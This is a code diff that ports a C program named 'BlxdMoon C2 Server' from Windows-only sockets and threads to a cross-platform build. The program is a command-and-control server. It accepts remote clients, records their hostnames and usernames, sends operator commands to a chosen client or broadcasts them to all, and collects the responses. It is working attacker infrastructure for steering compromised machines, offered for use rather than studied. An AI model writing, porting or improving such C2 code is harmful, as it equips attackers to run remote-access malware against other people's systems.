@@ -4,11 +4,56 @@
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <winsock2.h>
-#include <windows.h>
 #include <time.h>
 
-#define bzero(p, size) (void)memset((p), 0, (size))
+// Cross-platform abstractions
+#ifdef _WIN32
+    #include <winsock2.h>
+    #include <windows.h>
+    typedef CRITICAL_SECTION mutex_t;
+    typedef HANDLE thread_t;
+    typedef int socklen_t;  // Not defined on Windows
+    #define SOCKET_TYPE SOCKET
+    #define INVALID_SOCK INVALID_SOCKET
+    #define CLOSE_SOCKET closesocket
+    #define CLEAR_SCREEN "cls"
+    #define MUTEX_INIT(m) InitializeCriticalSection(&(m))
+    #define MUTEX_LOCK(m) EnterCriticalSection(&(m))
+    #define MUTEX_UNLOCK(m) LeaveCriticalSection(&(m))
+    #define MUTEX_DESTROY(m) DeleteCriticalSection(&(m))
+    #define THREAD_RETURN DWORD WINAPI
+    #define THREAD_RETURN_VALUE 0
+    #define SOCKET_INIT() do { WSADATA d; WSAStartup(MAKEWORD(2,2), &d); } while(0)
+    #define SOCKET_CLEANUP() WSACleanup()
+#else
+    #include <sys/socket.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <unistd.h>
+    #include <pthread.h>
+    #include <sys/time.h>
+    typedef pthread_mutex_t mutex_t;
+    typedef pthread_t thread_t;
+    #define SOCKET_TYPE int
+    #define INVALID_SOCK -1
+    #define CLOSE_SOCKET close
+    #define SOCKET_ERROR -1
+    #define CLEAR_SCREEN "clear"
+    #define MUTEX_INIT(m) pthread_mutex_init(&(m), NULL)
+    #define MUTEX_LOCK(m) pthread_mutex_lock(&(m))
+    #define MUTEX_UNLOCK(m) pthread_mutex_unlock(&(m))
+    #define MUTEX_DESTROY(m) pthread_mutex_destroy(&(m))
+    #define THREAD_RETURN void*
+    #define THREAD_RETURN_VALUE NULL
+    #define SOCKET_INIT() ((void)0)
+    #define SOCKET_CLEANUP() ((void)0)
+#endif
+
+// bzero is available on POSIX, define only for Windows
+#ifdef _WIN32
+    #define bzero(p, size) (void)memset((p), 0, (size))
+#endif
+
 #define MAX_CLIENTS 100
 #define BUFFER_SIZE 1024
 #define RESPONSE_SIZE 18384
@@ -16,13 +61,13 @@
 // Client structure
 typedef struct {
     int id;
-    SOCKET socket;
+    SOCKET_TYPE socket;
     struct sockaddr_in address;
     char ip[16];
     char hostname[64];
     char username[64];
     int active;
-    HANDLE thread;
+    thread_t thread;
     time_t connected_at;
 } Client;
 
@@ -30,9 +75,9 @@ typedef struct {
 Client clients[MAX_CLIENTS];
 int num_clients = 0;
 int selected_client = -1;  // -1 = main menu, >=0 = interacting with client
-SOCKET listen_sock = INVALID_SOCKET;
+SOCKET_TYPE listen_sock = INVALID_SOCK;
 int server_running = 1;
-CRITICAL_SECTION clients_lock;
+mutex_t clients_lock;
 
 // Forward declarations
 void print_prompt(void);
@@ -40,10 +85,10 @@ void print_main_menu(void);
 void print_client_list(void);
 void handle_main_menu_command(char *cmd);
 void handle_client_command(int client_id, char *cmd);
-int add_client(SOCKET sock, struct sockaddr_in addr);
+int add_client(SOCKET_TYPE sock, struct sockaddr_in addr);
 void remove_client(int client_id);
-DWORD WINAPI accept_thread(LPVOID param);
-DWORD WINAPI client_handler(LPVOID param);
+THREAD_RETURN accept_thread(void *param);
+THREAD_RETURN client_handler(void *param);
 
 // ASCII Art
 void printAsciiArt()
@@ -91,7 +136,7 @@ void print_main_menu(void)
     printf("\n\033[1;33m=== BlxdMoon C2 Server ===\033[0m\n");
     printf("Connected clients: %d\n\n", num_clients);
 
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].active) {
             char time_str[32];
@@ -104,7 +149,7 @@ void print_main_menu(void)
                    time_str);
         }
     }
-    LeaveCriticalSection(&clients_lock);
+    MUTEX_UNLOCK(clients_lock);
 
     if (num_clients == 0) {
         printf("  (No clients connected)\n");
@@ -122,7 +167,7 @@ void print_client_list(void)
 {
     printf("\n\033[1;33mConnected Clients:\033[0m\n");
 
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
     int count = 0;
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].active) {
@@ -137,14 +182,14 @@ void print_client_list(void)
             count++;
         }
     }
-    LeaveCriticalSection(&clients_lock);
+    MUTEX_UNLOCK(clients_lock);
 
     printf("\nTotal: %d client(s)\n", count);
 }
 
-int add_client(SOCKET sock, struct sockaddr_in addr)
+int add_client(SOCKET_TYPE sock, struct sockaddr_in addr)
 {
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
 
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (!clients[i].active) {
@@ -158,12 +203,12 @@ int add_client(SOCKET sock, struct sockaddr_in addr)
             clients[i].connected_at = time(NULL);
             num_clients++;
 
-            LeaveCriticalSection(&clients_lock);
+            MUTEX_UNLOCK(clients_lock);
             return i;
         }
     }
 
-    LeaveCriticalSection(&clients_lock);
+    MUTEX_UNLOCK(clients_lock);
     return -1;  // No space
 }
 
@@ -171,10 +216,10 @@ void remove_client(int client_id)
 {
     if (client_id < 0 || client_id >= MAX_CLIENTS) return;
 
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
 
     if (clients[client_id].active) {
-        closesocket(clients[client_id].socket);
+        CLOSE_SOCKET(clients[client_id].socket);
         clients[client_id].active = 0;
         num_clients--;
 
@@ -185,14 +230,14 @@ void remove_client(int client_id)
         }
     }
 
-    LeaveCriticalSection(&clients_lock);
+    MUTEX_UNLOCK(clients_lock);
 }
 
 void broadcast_command(char *cmd)
 {
     printf("\n[*] Broadcasting to %d clients...\n", num_clients);
 
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
 
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].active) {
@@ -200,12 +245,12 @@ void broadcast_command(char *cmd)
         }
     }
 
-    LeaveCriticalSection(&clients_lock);
+    MUTEX_UNLOCK(clients_lock);
 
     // Collect responses
     printf("[*] Collecting responses...\n");
 
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
 
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].active) {
@@ -213,9 +258,15 @@ void broadcast_command(char *cmd)
             bzero(response, sizeof(response));
 
             // Set timeout for receive
-            DWORD timeout = 5000;  // 5 seconds
+#ifdef _WIN32
+            DWORD timeout = 5000;  // 5 seconds (ms)
             setsockopt(clients[i].socket, SOL_SOCKET, SO_RCVTIMEO,
                        (const char*)&timeout, sizeof(timeout));
+#else
+            struct timeval timeout = {5, 0};  // 5 seconds
+            setsockopt(clients[i].socket, SOL_SOCKET, SO_RCVTIMEO,
+                       &timeout, sizeof(timeout));
+#endif
 
             int received = recv(clients[i].socket, response, sizeof(response), 0);
 
@@ -227,7 +278,7 @@ void broadcast_command(char *cmd)
         }
     }
 
-    LeaveCriticalSection(&clients_lock);
+    MUTEX_UNLOCK(clients_lock);
 }
 
 void handle_main_menu_command(char *cmd)
@@ -275,7 +326,7 @@ void handle_main_menu_command(char *cmd)
         print_main_menu();
     }
     else if (strcmp(cmd, "clear") == 0 || strcmp(cmd, "cls") == 0) {
-        system("cls");
+        system(CLEAR_SCREEN);
         printAsciiArt();
     }
     else {
@@ -324,17 +375,17 @@ void handle_client_command(int client_id, char *cmd)
         return;
     }
 
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
 
     if (!clients[client_id].active) {
-        LeaveCriticalSection(&clients_lock);
+        MUTEX_UNLOCK(clients_lock);
         printf("\n[-] Client disconnected\n");
         selected_client = -1;
         return;
     }
 
-    SOCKET client_socket = clients[client_id].socket;
-    LeaveCriticalSection(&clients_lock);
+    SOCKET_TYPE client_socket = clients[client_id].socket;
+    MUTEX_UNLOCK(clients_lock);
 
     char buffer[BUFFER_SIZE];
     char response[RESPONSE_SIZE];
@@ -420,17 +471,18 @@ void handle_client_command(int client_id, char *cmd)
     printf("\n%s", response);
 }
 
-DWORD WINAPI accept_thread(LPVOID param)
+THREAD_RETURN accept_thread(void *param)
 {
+    (void)param;  // Unused parameter
     struct sockaddr_in client_address;
-    int client_length = sizeof(client_address);
+    socklen_t client_length = sizeof(client_address);
 
     while (server_running) {
-        SOCKET client_socket = accept(listen_sock,
+        SOCKET_TYPE client_socket = accept(listen_sock,
                                        (struct sockaddr *)&client_address,
                                        &client_length);
 
-        if (client_socket == INVALID_SOCKET) {
+        if (client_socket == INVALID_SOCK) {
             if (server_running) {
                 // Real error
                 continue;
@@ -464,36 +516,32 @@ DWORD WINAPI accept_thread(LPVOID param)
             }
         } else {
             // Too many clients
-            closesocket(client_socket);
+            CLOSE_SOCKET(client_socket);
         }
     }
 
-    return 0;
+    return THREAD_RETURN_VALUE;
 }
 
 int main()
 {
     // Initialize
     printAsciiArt();
-    InitializeCriticalSection(&clients_lock);
+    MUTEX_INIT(clients_lock);
 
     // Initialize all client slots
     for (int i = 0; i < MAX_CLIENTS; i++) {
         clients[i].active = 0;
     }
 
-    // Initialize WinSock
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        error("Couldn't initiate WinSock.");
-        return 1;
-    }
+    // Initialize sockets (Windows only, no-op on POSIX)
+    SOCKET_INIT();
 
     // Create listening socket
     listen_sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (listen_sock == INVALID_SOCKET) {
+    if (listen_sock == INVALID_SOCK) {
         error("Failed to create socket.");
-        WSACleanup();
+        SOCKET_CLEANUP();
         return 1;
     }
 
@@ -509,16 +557,16 @@ int main()
 
     if (bind(listen_sock, (struct sockaddr *)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
         error("Failed to bind socket. Port may be in use.");
-        closesocket(listen_sock);
-        WSACleanup();
+        CLOSE_SOCKET(listen_sock);
+        SOCKET_CLEANUP();
         return 1;
     }
 
     // Listen
     if (listen(listen_sock, SOMAXCONN) == SOCKET_ERROR) {
         error("Failed to listen on socket.");
-        closesocket(listen_sock);
-        WSACleanup();
+        CLOSE_SOCKET(listen_sock);
+        SOCKET_CLEANUP();
         return 1;
     }
 
@@ -526,7 +574,12 @@ int main()
     info("[*] Waiting for connections...\n");
 
     // Start accept thread
-    HANDLE hAcceptThread = CreateThread(NULL, 0, accept_thread, NULL, 0, NULL);
+    thread_t hAcceptThread;
+#ifdef _WIN32
+    hAcceptThread = CreateThread(NULL, 0, accept_thread, NULL, 0, NULL);
+#else
+    pthread_create(&hAcceptThread, NULL, accept_thread, NULL);
+#endif
 
     // Show menu
     print_main_menu();
@@ -552,21 +605,25 @@ int main()
     // Cleanup
     printf("\n[*] Closing all connections...\n");
 
-    EnterCriticalSection(&clients_lock);
+    MUTEX_LOCK(clients_lock);
     for (int i = 0; i < MAX_CLIENTS; i++) {
         if (clients[i].active) {
             send(clients[i].socket, "q", 2, 0);
-            closesocket(clients[i].socket);
+            CLOSE_SOCKET(clients[i].socket);
         }
     }
-    LeaveCriticalSection(&clients_lock);
+    MUTEX_UNLOCK(clients_lock);
 
-    closesocket(listen_sock);
+    CLOSE_SOCKET(listen_sock);
+#ifdef _WIN32
     WaitForSingleObject(hAcceptThread, 1000);
     CloseHandle(hAcceptThread);
+#else
+    pthread_join(hAcceptThread, NULL);
+#endif
 
-    DeleteCriticalSection(&clients_lock);
-    WSACleanup();
+    MUTEX_DESTROY(clients_lock);
+    SOCKET_CLEANUP();
 
     printf("[+] Server shutdown complete.\n");
     return 0;
